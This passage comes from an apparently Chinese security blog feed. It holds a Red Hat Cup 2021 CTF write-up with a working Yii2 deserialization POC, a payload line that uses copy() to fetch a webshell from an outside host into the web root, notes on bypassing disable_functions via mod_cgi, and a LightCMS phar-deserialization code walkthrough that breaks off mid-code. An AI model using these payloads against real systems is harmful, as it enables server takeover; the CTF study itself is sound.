谁就用谁的方法</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//啥也没干的 getHostAddress()</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>【代码审计】知识星球 - Java安全漫谈</p><p><a href="https://xz.aliyun.com/t/9417#toc-2">https://xz.aliyun.com/t/9417#toc-2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大概学了一个多月Java，感觉有点底子了以后，终于开始学习Java相关漏洞了。搓搓手 ==&lt;/p&gt;
&lt;p&gt;开个ysoserial的新坑。。日后慢慢填 = =&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/categories/java/ysoserial/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="URLDNS" scheme="http://example.com/tags/URLDNS/"/>
    
    <category term="ysoserial" scheme="http://example.com/tags/ysoserial/"/>
    
  </entry>
  
  <entry>
    <title>CTF玩耍系列[3] - [红帽杯2021] WEB2 &amp;&amp; WEB4</title>
    <link href="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/"/>
    <id>http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/</id>
    <published>2021-05-10T14:49:01.000Z</published>
    <updated>2021-05-10T15:47:31.457Z</updated>
    
    <content type="html"><![CDATA[<p>昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。</p><p>这次还是只解出来一题WEB2，，老废物了。。。。</p><p>最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。= =</p><span id="more"></span><br><h1 id="WEB2-Yii2反序列化"><a href="#WEB2-Yii2反序列化" class="headerlink" title="WEB2 - Yii2反序列化"></a>WEB2 - Yii2反序列化</h1><p>这道题主要考察两个东西吧：Yii2反序列的链子 及 Apache mod_cgi bypass disable_functions</p><br><p>首先找入口点，比赛平台给的控制器为  <code>/controllers/SiteController.php</code> 。</p><p>找到反序列化的入口点 <code>actionAbout()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;Hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = base64_decode(<span class="variable">$message</span>);</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不清楚路由的，看到页面上的 <strong>“About” 按钮</strong>，点过去就是了。</p><br><p>反序列化POC，这里就不细细分析了，详情可以看看下面这些文章：</p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p><p><a href="https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg">https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//执行的函数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="comment">//函数参数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;999&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过该POC，得到 disable_functions ，这里注意下，由于有 disable_functions。所以在 poc上无脑冲命令执行的将会得到报错回显。。。这可不是反序列化链子错了。。而是函数被禁用了。。</p><br><p><strong>disable_functions内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,<span class="keyword">unset</span>,unlink,<span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>经过了多次测试后，得到这玩意有两个坑：</p><ol><li>使用 <code>assert(eval())</code> 形式执行命令时，注意 eval 里的语句最后要手动加个 <code>die()</code>，不然会使得程序继续执行而报错</li><li>直接写shell，该程序会自动将文件内 $ 后面的字符全部删去，导致无法直接写shell，但可以通过 php 的 copy 函数从 vps 上把shell扒拉下来</li></ol><br><p><strong>修改POC：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//这里的Web目录可以根据前面的 phpinfo 得知</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;eval(\&#x27;var_dump(copy(&quot;https://xxx.com/11.txt&quot;,&quot;/var/www/html/web/122.php&quot;));die();\&#x27;);&#x27;</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><br><p>上shell后，在 / 目录下发现 readflag 文件。查看权限发现是 003 是 wx 权限，没r权限。说明我们需要执行这个文件才能获取 flag。  </p><br><p>由于 putenv 被禁用了我们不可能使用 LD_PRELOAD 来 Bypass disable_function 。通过查看 apache配置文件可知，.htaccess 开着，并且mod_cgi 也开着。想到也许能通过 .htaccess来指定加载另外一个 php.ini。本以为是史无前例的发现，百度了才发现原来是人尽皆知的东西。。。。==</p><br><p><strong>httpd.conf</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">Directory</span> <span class="string">&quot;/var/www/html/web/&quot;</span>&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    <span class="comment"># Allow open access:</span></span><br><span class="line">    <span class="keyword">Require</span> all granted</span><br><span class="line">&lt;/<span class="built_in">Directory</span>&gt;</span><br></pre></td></tr></table></figure><br><p>我们可以使用  Apache Mod CGI 来 bypass，图省事直接用蚁剑插件。。这里挖个坑，过段时间没事干了去研究下 bypass disable_functions 的原理。。翻找文章的时候发现了 <a href="https://blog.csdn.net/rfrder/article/details/109078117">一篇文</a> 感觉写的还可以。</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1.png" width="600px"><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/2.png" width="600px"><br><h1 id="WEB4-LightCMS-0day"><a href="#WEB4-LightCMS-0day" class="headerlink" title="WEB4 - LightCMS 0day"></a>WEB4 - LightCMS 0day</h1><p><a href="https://igml.top/2021/05/10/lightcms-RCE/#more">参考原文</a></p><p>LightCMS 是基于 Laravel 框架的一个CMS。目前的最新版 v1.3.7 基于 Laravel 6.x 开发，PHP&gt;=7.2。</p><p><strong>挖掘思路：</strong></p><ol><li>搜索得到 LightCMS 的历史漏洞 <a href="https://github.com/eddy8/LightCMS/issues/19">RCE in “catchImage”</a>‘  (CVE-2021-27112)</li><li>得知LightCMS可以上传远程文件</li><li><strong>若</strong> 解析远程文件时存在文件函数，PHP&lt;8 可触发 phar 反序列化</li><li>在 phpggc 中有 Laravel 6.x 的链子</li></ol><p>按着这个思路，我们重点调试上传远程文件时的代码即可。（这些都是后面看了wp才得出的结论==，当时根本没有想到 Phar反序列化和 文件上传结合起来。。。果然还是太菜了）</p><h2 id="补充点-Laravel-的知识"><a href="#补充点-Laravel-的知识" class="headerlink" title="补充点 Laravel 的知识"></a>补充点 Laravel 的知识</h2><p>由于之前没怎么摸过 Laravel，这里提一点 Laravel的基本知识，有助于理解这个漏洞</p><h3 id="路由、控制器"><a href="#路由、控制器" class="headerlink" title="路由、控制器"></a>路由、控制器</h3><p>路由文件位置： <strong>/routes</strong></p><p>控制器文件位置：**/app/Http/Controllers**</p><p>/app/Http 目录结构：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-1.png" width="300px"><p><strong>路由</strong></p><p>路由文件会被 <code>App\Providers\RouteServiceProvider</code> 自动加载。可以在该文件中添加路由文件。格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//api 和 web 是默认就有的</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapApiRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapWebRoutes();</span><br><span class="line">    <span class="comment">//admin 和 member 是 LightCMS 自己加的</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapMemberRoutes();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要写对应路由文件的路由</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mapAdminRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Route::prefix(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        -&gt;middleware(<span class="string">&#x27;web&#x27;</span>)</span><br><span class="line">        <span class="comment">//路由文件对应的模块位置</span></span><br><span class="line">        -&gt;namespace(<span class="keyword">$this</span>-&gt;namespace . <span class="string">&#x27;\Admin&#x27;</span>)</span><br><span class="line">        <span class="comment">//路由文件位置</span></span><br><span class="line">        -&gt;group(base_path(<span class="string">&#x27;routes/admin.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>知道了有哪些路由文件被加载后，我们直接看对应的路由文件 (<code>routes/admin.php</code>)，格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Route::group(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;admin::&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        .....   </span><br><span class="line">        Route::middleware(<span class="string">&#x27;log:admin&#x27;</span>, <span class="string">&#x27;auth:admin&#x27;</span>, <span class="string">&#x27;authorization:admin&#x27;</span>)-&gt;group(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//1. POST请求才会执行该路由</span></span><br><span class="line">            <span class="comment">//2. 路由 url 格式为 /neditor/serve/。&#123;type&#125; 表示参数</span></span><br><span class="line">            <span class="comment">//3. NEditorController@serve 对应 /app/Http/Controllers/Admin/NEditorController.php 的  serve() 方法</span></span><br><span class="line">            Route::post(<span class="string">&#x27;/neditor/serve/&#123;type&#125;&#x27;</span>, <span class="string">&#x27;NEditorController@serve&#x27;</span>)-&gt;name(<span class="string">&#x27;neditor.serve&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>综上可知发送 POST格式的 <code>admin/neditor/serve/xxx</code> 会被路由到 <code>/app/Http/Controllers/Admin/NEditorController.php</code> 的<code>serve()</code>方法。这个php文件就是开发者自己写的处理业务逻辑的文件了</p><p>查看 <code>serve()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的 $type 对应路由中定义的参数 &#123;type&#125;</span></span><br><span class="line"><span class="comment">//即发送请求 admin/neditor/serve/xxx 时，$type值为 xxx</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serve</span>(<span class="params">Request <span class="variable">$request</span>, <span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!method_exists(<span class="built_in">self</span>::class, <span class="variable">$type</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;未知操作&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//根据传入$type调用本类同名方法</span></span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="built_in">self</span>::class . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$type</span>, <span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞逻辑"><a href="#漏洞逻辑" class="headerlink" title="漏洞逻辑"></a>漏洞逻辑</h2><p>根据 CVE-2021-27112 的漏洞点，定位到 <code>NEditorController.php</code> 的 <code>catchImage()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">catchImage</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = array_unique((<span class="keyword">array</span>) <span class="variable">$request</span>-&gt;post(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">    <span class="variable">$urls</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//解析$_POST[&#x27;file&#x27;]，进行远程文件拉取</span></span><br><span class="line">        <span class="comment">//!! 重点跟进该方法 !!</span></span><br><span class="line">        <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;fetchImageFile(<span class="variable">$v</span>);</span><br><span class="line">        <span class="comment">//!! 重点跟进该方法 !!</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//CVE-2021-27112补丁，校验远程文件合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$image</span> || !<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>] || !<span class="keyword">$this</span>-&gt;isAllowedImageType(<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$path</span> = date(<span class="string">&#x27;Ym&#x27;</span>) . <span class="string">&#x27;/&#x27;</span> . md5(<span class="variable">$v</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">        <span class="comment">//保存文件</span></span><br><span class="line">        Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))</span><br><span class="line">            -&gt;put(<span class="variable">$path</span>, <span class="variable">$image</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//返回保存文件路径</span></span><br><span class="line">        <span class="variable">$urls</span>[] = [</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span> =&gt; Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))-&gt;url(<span class="variable">$path</span>),</span><br><span class="line">            <span class="string">&#x27;source&#x27;</span> =&gt; <span class="variable">$v</span>,</span><br><span class="line">            <span class="string">&#x27;state&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;list&#x27;</span> =&gt; <span class="variable">$urls</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>fetchImageFile()</code> 方法。该方法可简化成如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchImageFile</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//拉取远程文件</span></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$options</span> =  [</span><br><span class="line">        CURLOPT_URL =&gt; <span class="variable">$url</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_USERAGENT =&gt; <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);</span><br><span class="line">    <span class="comment">//$data为远程文件内容</span></span><br><span class="line">    <span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// !!重点方法!!</span></span><br><span class="line"><span class="variable">$image</span> = Image::make(<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">// !!重点方法!!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取文件的MIME类型</span></span><br><span class="line">    <span class="variable">$mime</span> = <span class="variable">$image</span>-&gt;mime();</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;extension&#x27;</span> =&gt; <span class="variable">$extension</span> ?? (<span class="variable">$mime</span> ? strtolower(explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$mime</span>)[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Image 是一个 Facade。具体的 Facade逻辑可以暂时不用理会，只需知道 Facade 的 <code>__callStatic()</code> 有一段代码 <code>$instance-&gt;$method(...$args);</code> 即可。</p><p><code>Image::make()</code> 最终调用了 <code>Intervention\Image\ImageManager make()</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Intervention\Image\ImageManager</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//createDriver()将实例化Intervention\Image\Gd\Driver类并返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;createDriver()-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\Gd\Driver <span class="keyword">extends</span> \Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Decoder <span class="variable">$decoder</span> = <span class="literal">null</span>, Encoder <span class="variable">$encoder</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">//执行完这个 __construct() 后，会自动执行抽象父类 AbstractDriver 的 init()方法</span></span><br><span class="line">    <span class="comment">//具体好像是PHP的某个机制使得其会自动调用init()。还没深究</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;decoder = <span class="variable">$decoder</span> ? <span class="variable">$decoder</span> : <span class="keyword">new</span> Decoder;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;encoder = <span class="variable">$encoder</span> ? <span class="variable">$encoder</span> : <span class="keyword">new</span> Encoder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;decoder-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDecoder</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line"><span class="comment">//根据远程文件的内容，执行不一样的方法</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//上传文件是图片（二进制数据），则为true</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isBinary():</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="comment">//若文件内容是一串url，则为true</span></span><br><span 